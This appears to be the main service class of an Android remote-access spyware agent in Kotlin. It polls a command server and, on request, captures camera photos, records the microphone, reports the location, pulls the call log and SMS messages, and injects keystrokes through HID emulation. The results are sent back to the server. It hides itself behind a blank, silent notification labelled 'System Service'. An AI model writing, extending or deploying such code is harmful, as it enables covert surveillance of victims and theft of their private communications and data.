package com.alingo.agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.alingo.agent.cache.LocalCache
import com.alingo.agent.client.BluetoothClient
import com.alingo.agent.client.ConnectionManager
import com.alingo.agent.client.WifiClient
import com.alingo.agent.handlers.*
import com.alingo.agent.hid.HidHandler
import kotlinx.coroutines.*
import java.util.UUID

class AgentService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var connectionManager: ConnectionManager
    private lateinit var cache: LocalCache
    private lateinit var hidHandler: HidHandler

    private var isRunning = false
    private var deviceUid = ""
    private var server = ""
    private var agentToken = ""

    companion object {
        private const val TAG = "AgentService"
        private const val CHANNEL_ID = "alingo_system"
        private const val NOTIFICATION_ID = 1001
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        cache = LocalCache(this)
        hidHandler = HidHandler(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) return START_STICKY
        isRunning = true

        val prefs = getSharedPreferences("alingo", Context.MODE_PRIVATE)
        server = prefs.getString("server", "") ?: ""
        agentToken = prefs.getString("token", "") ?: ""
        deviceUid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()

        if (server.isEmpty()) {
            Log.e(TAG, "❌ Server URL missing")
            stopSelf()
            return START_NOT_STICKY
        }

        val wifi = WifiClient(server, agentToken)
        val bt = BluetoothClient(this)

        connectionManager = ConnectionManager(this, wifi, bt)

        scope.launch {
            val success = wifi.register(deviceUid, token = agentToken)
            if (success) {
                Log.i(TAG, "✅ Registered")
                startPolling()
            } else {
                Log.e(TAG, "❌ Registration failed")
            }
        }

        scope.launch {
            while (isRunning) {
                delay(60000)
                connectionManager.retryQueuedCommands()
            }
        }

        return START_STICKY
    }

    private fun startPolling() {
        scope.launch {
            while (isRunning) {
                try {
                    // ✅ Heartbeat
                    connectionManager.wifiClient.heartbeat(deviceUid)

                    val commands = connectionManager.wifiClient.pollCommands()
                    if (commands != null && commands.isNotEmpty()) {
                        Log.i(TAG, "📥 ${commands.size} commands")
                        commands.forEach { cmd ->
                            scope.launch { executeCommand(cmd) }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Poll: ${e.message}")
                }
                delay(10000)
            }
        }
    }

    private suspend fun executeCommand(cmd: Map<String, Any?>) {
        val type = cmd["command_type"] as? String ?: return
        val payload = (cmd["command_payload"] as? String)?.let {
            try {
                org.json.JSONObject(it).toMap()
            } catch (e: Exception) { emptyMap() }
        } ?: emptyMap()

        Log.i(TAG, "→ $type")

        val result: Map<String, Any?> = try {
            when (type) {
                "get_location" -> LocationHandler.getLocation(this)
                "camera_front" -> CameraHandler.capture("front")
                "camera_back" -> CameraHandler.capture("back")
                "record_mic" -> MicHandler.record((payload["duration"] as? Int) ?: 30)
                "get_calls" -> CallLogHandler.getCalls(this, (payload["limit"] as? Int) ?: 50)
                "get_sms" -> SmsHandler.getSms(this, (payload["limit"] as? Int) ?: 50)
                "hid_start" -> { hidHandler.start { }; mapOf("success" to true) }
                "hid_type" -> { hidHandler.typeText(payload["text"] as? String ?: ""); mapOf("success" to true) }
                "hid_key" -> { hidHandler.pressKey((payload["key"] as? Int) ?: 0); mapOf("success" to true) }
                else -> mapOf("error" to "unsupported: $type")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
            mapOf("error" to (e.message ?: "unknown"))
        }

        val cmdId = cmd["id"]?.toString() ?: return
        val (_, mode) = connectionManager.sendCommand(mapOf(
            "command_id" to cmdId,
            "result" to result
        ))
        Log.i(TAG, "✅ $type → $mode")
    }

    override fun onDestroy() {
        isRunning = false
        scope.cancel()
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }
}

private fun org.json.JSONObject.toMap(): Map<String, Any?> {
    val map = mutableMapOf<String, Any?>()
    keys().forEach { key -> map[key] = get(key) }
    return map
}
